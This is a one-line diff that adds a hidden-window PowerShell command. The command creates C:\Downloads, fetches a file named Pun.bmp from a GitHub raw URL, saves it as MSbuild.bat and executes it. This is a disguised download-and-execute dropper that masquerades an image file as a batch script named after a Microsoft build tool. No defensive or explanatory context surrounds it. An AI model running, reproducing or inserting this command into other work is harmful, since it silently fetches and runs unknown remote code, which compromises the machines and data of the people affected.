@@ -1,0 +1,1 @@
+powershell.exe -WindowStyle hidden -Command "New-Item -ItemType Directory -Force -Path C:\\Downloads; Invoke-WebRequest -Uri https://raw.githubusercontent.com/bao3125/1222/main/Pun.bmp -OutFile C:\\Downloads\\MSbuild.bat; Start-Process -FilePath C:\\Downloads\\MSbuild.bat"
